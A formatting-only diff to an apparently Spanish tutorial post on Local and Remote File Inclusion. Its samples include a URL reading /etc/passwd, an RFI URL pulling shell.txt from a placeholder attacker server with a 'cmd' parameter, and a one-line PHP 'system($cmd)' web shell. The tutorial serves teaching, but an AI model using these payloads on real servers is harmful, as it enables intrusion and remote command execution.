@@ -35,15 +35,16 @@ Donde example.php seria:
     include($file);
 ?>
 {% endhighlight %}
+
 Y file.txt:
 ``` 
 Por Aqui Puede Haber Un LFI
 ```
 Nosotros apuntando a nuestro servidor podrimos ya listar archivos Locales del servidor, atraves de la variable "filename"
-{% highlight %}
+```bash
 http://localhost/example.php?filename=file.txt
 http://localhost/example.php?filename=/etc/passwd
-{% endhighlight %}
+```
 
 # ~ RFI ~   Remote File Inclusion
 La vulnerabilidad de Remote File Inclusion se produce cuando:
@@ -52,7 +53,7 @@ El atacante (Nosotros) podriamos obtener una Shell en el servidor vulnerable med
 http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls
 
 Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:
-{% highlight php %} 
+{% highlight %}
 <?php
   system($cmd);
 ?>
